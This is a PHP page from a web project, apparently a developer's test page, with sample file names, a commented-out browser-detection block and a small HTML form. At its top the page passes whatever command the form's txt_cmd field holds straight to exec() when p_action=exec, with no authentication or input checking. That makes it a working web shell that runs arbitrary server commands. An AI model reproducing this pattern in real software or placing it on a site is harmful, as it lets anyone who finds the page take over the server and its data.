<?php
require_once('./config.php');
require_once('./lib.php');

date_default_timezone_set('Asia/Tokyo');

$p_action = array_get_value($_REQUEST, 'p_action' ,"");
if (!empty($p_action))
{
	if ($p_action == "exec")
	{
		$tmpcmd = array_get_value($_POST,"txt_cmd" ,"");
		echo $tmpcmd;
		echo exec($tmpcmd);
	}
}
//echo $_SERVER["HTTP_USER_AGENT"];
//echo phpinfo();


//    if(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "MSIE 8.0")) {
//$visitor_browser = "Internet Explorer 8.0";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "MSIE 7.0")) {
//$visitor_browser = "Internet Explorer 7.0";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "MSIE 6.0")) {
//$visitor_browser = "Internet Explorer 6.0";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "MSIE 5.5")) {
//$visitor_browser = "Internet Explorer 5.5";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "MSIE 5.0")) {
//$visitor_browser = "Internet Explorer 5.0";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "MSIE 4.01")) {
//$visitor_browser = "Internet Explorer 4.01";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "NetCaptor")) {
//$visitor_browser = "NetCaptor";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "Netscape")) {
//$visitor_browser = "Netscape";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "Lynx")) {
//$visitor_browser = "Lynx";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "Opera")) {
//$visitor_browser = "Opera";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "Konqueror")) {
//$visitor_browser = "Konqueror";
//} elseif(strpos($HTTP_SERVER_VARS[HTTP_USER_AGENT], "Mozilla/5.0")) {
//$visitor_browser = "Mozilla";
//} else {
//$visitor_browser = "others";
//}
//echo $visitor_browser;


?>
<html>
<head>
   <title> New Document </title>
  <script type="text/javascript">
  function test_batch()
  {
  	var mno = document.getElementById("txt_phmno").value;

  	document.getElementById("img_tst").src = "./image_search_kikan.php?p_photo_mno=" + mno;
  	//document.location.href = "./image_search_kikan.php?p_photo_mno=" + mno;
  }
  </script>
</head>
<body>
<h2>p_ejdi_sample.csv</h2>
<br/>
<h2>p_ejpl_sample.csv</h2>
<br/>
<h2>p_limi_sample.csv</h2>
<br/>
<h3>login_image_batch.php</h3>
<br/>

<form action="test_disp.php?p_action=exec" name="batchform" method="post">
<input type="text" id="txt_cmd" name="txt_cmd" value="" style="width:400px"/>
<input type="submit" value="execute">
<!--
<br/><br/><br/><br/><br/>
<img src="" id="img_tst" />
<br/><br/><br/><br/><br/>
<input type="button" value="disp_counter_p_date" onclick="javascript:document.location.href='./disp_counter_p_date.php';">
<br/><br/><br/><br/><br/>
<input type="button" value="disp_counter_photo_mno" onclick="javascript:document.location.href='./disp_counter_photo_mno.php';">
 -->
</form>
</body>
</html>